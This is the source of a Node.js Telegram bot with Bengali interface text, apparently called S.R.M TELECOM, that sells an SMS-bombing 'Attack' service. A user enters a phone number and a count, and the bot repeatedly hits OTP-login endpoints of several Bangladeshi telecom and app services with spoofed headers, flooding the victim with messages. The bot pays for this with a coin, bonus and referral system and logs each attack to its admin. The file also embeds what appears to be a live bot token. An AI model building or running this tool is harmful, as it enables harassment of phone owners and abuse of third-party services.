const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; 
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস হ্যান্ডলিং (ইউজার ও কনফিগারেশন)
const dbFile = 'users.json';
const configFile = 'config.json';
let users = {};
let config = { redeemCode: null, reward: 0, limit: 0, usedBy: [] };

if (fs.existsSync(dbFile)) { try { users = JSON.parse(fs.readFileSync(dbFile)); } catch (e) { users = {}; } }
if (fs.existsSync(configFile)) { try { config = JSON.parse(fs.readFileSync(configFile)); } catch (e) { } }

function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }
function saveConfig() { fs.writeFileSync(configFile, JSON.stringify(config, null, 2)); }

// Render সচল রাখতে সার্ভার
http.createServer((req, res) => { res.write("S.R.M Master Engine is Live!"); res.end(); }).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM চালু হয়েছে...");

const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }, { text: '👤 প্রোফাইল ও ব্যালেন্স' }],
            [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
            [{ text: '🧧 কয়েন গিফট (Gift)' }, { text: '🎫 রিডিম কোড (Redeem)' }],
            [{ text: '📢 অফিশিয়াল চ্যানেল' }]
        ],
        resize_keyboard: true
    }
};

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    // ১. ইউজার রেজিস্ট্রেশন
    if (!users[userId]) {
        users[userId] = { balance: 0, lastBonus: 0, step: '', name: msg.from.first_name || "User", isBanned: false };
        saveDB();
    }
    if (users[userId].isBanned) return bot.sendMessage(chatId, "🚫 আপনাকে ব্যান করা হয়েছে।");

    // ২. ফোর্স জয়েন
    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start' && !text.startsWith('/start')) {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\n\nচ্যানেলে জয়েন করে আবার /start দিন।`, {
            reply_markup: { inline_keyboard: [[{ text: '📢 জয়েন করুন', url: channelLink }]] }
        });
    }

    // ৩. অ্যাডমিন প্যানেল
    if (userId === adminId) {
        // রিডিম কোড সেট: setcode [CODE] [REWARD] [LIMIT]
        if (text.startsWith('setcode ')) {
            const [_, code, reward, limit] = text.split(' ');
            config.redeemCode = code;
            config.reward = parseInt(reward);
            config.limit = parseInt(limit);
            config.usedBy = [];
            saveConfig();
            return bot.sendMessage(chatId, `✅ সফল! কোড: **${code}** সেট করা হয়েছে।`);
        }
        if (text === 'codeoff') {
            config.redeemCode = null; saveConfig();
            return bot.sendMessage(chatId, "📴 রিডিম কোড অপশন বন্ধ করা হয়েছে।");
        }
        if (text.startsWith('give ')) {
            const [_, tId, amt] = text.split(' ');
            if (users[tId]) { users[tId].balance += parseInt(amt); saveDB(); bot.sendMessage(chatId, `✅ সফলভাবে কয়েন দেওয়া হয়েছে।`); }
            return;
        }
        if (text === '/userlist') {
            let list = `📊 **User List**\n`;
            Object.keys(users).forEach((id, i) => list += `${i+1}. ${users[id].name} (\`${id}\`) - 💰 ${users[id].balance}\n`);
            return bot.sendMessage(chatId, list, { parse_mode: "Markdown" });
        }
    }

    // ৪. ইউজার রিডিম সিস্টেম
    if (text === '🎫 রিডিম কোড (Redeem)') {
        if (!config.redeemCode) return bot.sendMessage(chatId, "❌ বর্তমানে কোনো একটিভ রিডিম কোড নেই।");
        users[userId].step = 'redeem_input'; saveDB();
        return bot.sendMessage(chatId, "🎫 কোডটি টাইপ করুন:", { reply_markup: { remove_keyboard: true } });
    }
    if (users[userId]?.step === 'redeem_input') {
        if (text === config.redeemCode) {
            if (config.usedBy.includes(userId)) return bot.sendMessage(chatId, "❌ আপনি অলরেডি নিয়েছেন!", mainMenu);
            if (config.usedBy.length >= config.limit) return bot.sendMessage(chatId, "❌ লিমিট শেষ!", mainMenu);
            users[userId].balance += config.reward;
            config.usedBy.push(userId);
            users[userId].step = ''; saveDB(); saveConfig();
            return bot.sendMessage(chatId, `✅ অভিনন্দন! আপনি **${config.reward}** কয়েন পেয়েছেন।`, mainMenu);
        } else {
            users[userId].step = ''; saveDB();
            return bot.sendMessage(chatId, "❌ ভুল কোড!", mainMenu);
        }
    }

    // ৫. গিফট সিস্টেম (Gift System)
    if (text === '🧧 কয়েন গিফট (Gift)') {
        users[userId].step = 'gift_id'; saveDB();
        return bot.sendMessage(chatId, "🆔 যাকে গিফট করবেন তার ID দিন:", { reply_markup: { remove_keyboard: true } });
    }
    if (users[userId]?.step === 'gift_id') {
        if (!users[text]) return bot.sendMessage(chatId, "❌ ইউজার পাওয়া যায়নি!", mainMenu);
        users[userId].gift_to = text; users[userId].step = 'gift_amount'; saveDB();
        return bot.sendMessage(chatId, `🔢 আপনি কত কয়েন পাঠাতে চান?`);
    }
    if (users[userId]?.step === 'gift_amount') {
        const amt = parseInt(text);
        const tId = users[userId].gift_to;
        if (isNaN(amt) || amt <= 0 || users[userId].balance < amt) return bot.sendMessage(chatId, "❌ ভুল বা অপর্যাপ্ত কয়েন!", mainMenu);
        users[userId].balance -= amt; users[tId].balance += amt; users[userId].step = ''; saveDB();
        bot.sendMessage(chatId, `✅ আপনি ${amt} কয়েন গিফট করেছেন।`, mainMenu);
        bot.sendMessage(tId, `🎁 **${users[userId].name}** আপনাকে ${amt} কয়েন গিফট করেছেন।`);
        return;
    }

    // ৬. মেনু ও স্টার্ট
    if (text === '/start' || text.startsWith('/start')) {
        return bot.sendMessage(chatId, `⚡ **S.R.M TELECOM** 👋\n💰 ব্যালেন্স: **${users[userId].balance} Coins**`, mainMenu);
    }
    if (text === '👤 প্রোফাইল ও ব্যালেন্স') {
        const bal = (userId === adminId) ? "Unlimited ♾" : users[userId].balance;
        return bot.sendMessage(chatId, `👤 ${users[userId].name}\n🆔 \`${userId}\`\n💰 Coins: ${bal}`, { parse_mode: "Markdown" });
    }
    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ ২৪ ঘণ্টা পর ট্রাই করুন।");
        users[userId].balance += 2; users[userId].lastBonus = now; saveDB();
        return bot.sendMessage(chatId, "✅ ২ কয়েন বোনাস পেয়েছেন।");
    }

    // ৭. অ্যাটাক ও এপিআই (Robi, BdTickets, Quizgiri Fixed)
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ কয়েন নেই!");
        users[userId].step = 'num'; saveDB();
        return bot.sendMessage(chatId, "📱 নম্বর দিন (১১ ডিজিট):", { reply_markup: { remove_keyboard: true } });
    }
    if (users[userId]?.step === 'num' && text.length === 11) {
        users[userId].target = text; users[userId].step = 'amount'; saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS? (১-৩০):");
    }
    if (users[userId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ ১-৩০ দিন।");
        const target = users[userId].target;
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = ''; saveDB();

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অ্যাটাক শুরু...`, mainMenu);
        let success = 0; let fail = 0;

        for (let i = 0; i < amount; i++) {
            // ১. Robi Next.js Fixed
            try { await axios.post('https://www.robi.com.bd/api/v1/user/otp-login/request', [{"msisdn": target}], { headers: { 'Accept': 'text/x-component', 'next-action': '7f059ca75e4421bcef70abad89cb5bb05cba717c30', 'X-Requested-With': 'mark.via.gp' }, timeout: 4000 }); success++; } catch (e) { fail++; }
            // ২. BdTickets 20100 Fixed
            try { await axios.post('https://api.bdtickets.com:20100/v1/auth', { "createUserCheck": true, "phoneNumber": "+88" + target, "applicationChannel": "WEB_APP" }, { headers: { 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://bdtickets.com', 'Referer': 'https://bdtickets.com/', 'X-Requested-With': 'mark.via.gp' }, timeout: 7000 }); success++; } catch (e) { fail++; }
            // ৩. Quizgiri Original Fixed
            try { await axios.post('https://developer.quizgiri.xyz/api/v2.0/send-otp', { "country_code": "+88", "phone": target }, { headers: { 'Authorization': 'Bearer', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Infinix X6531)', 'X-Requested-With': 'mark.via.gp', 'Origin': 'https://app.quizgiri.com.bd', 'Referer': 'https://app.quizgiri.com.bd/' }, timeout: 5000 }); success++; } catch (e) { fail++; }
            // ৪. Karigori, Iqra & Banglalink
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`); success++; } catch (e) {}
            try { await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', { "mobile": target }); success++; } catch (e) {}

            await new Promise(r => setTimeout(r, 4500)); 
        }

        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success} | ব্যর্থ: ${fail}`, mainMenu);
        bot.sendMessage(adminId, `⚠️ **LOG:** ${users[userId].name} attacked ${target}. Success: ${success}, Fail: ${fail}`);
    }
});
